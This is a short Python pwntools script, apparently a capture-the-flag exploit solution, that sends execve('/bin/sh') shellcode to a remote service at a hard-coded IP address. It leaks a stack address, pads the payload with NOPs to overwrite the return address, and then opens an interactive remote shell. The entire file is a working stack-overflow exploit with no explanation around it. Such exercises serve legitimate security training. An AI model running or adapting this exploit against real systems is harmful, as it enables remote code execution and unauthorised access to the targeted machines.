from pwn import *

shell="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p=remote("20.194.60.101", 9696)

p.recvuntil("0x")
leak=int(p.recv(14),16)

pay=shell
pay=pay.ljust(0x88, '\x90')
pay+=p64(leak)

p.sendline(pay)

p.interactive()
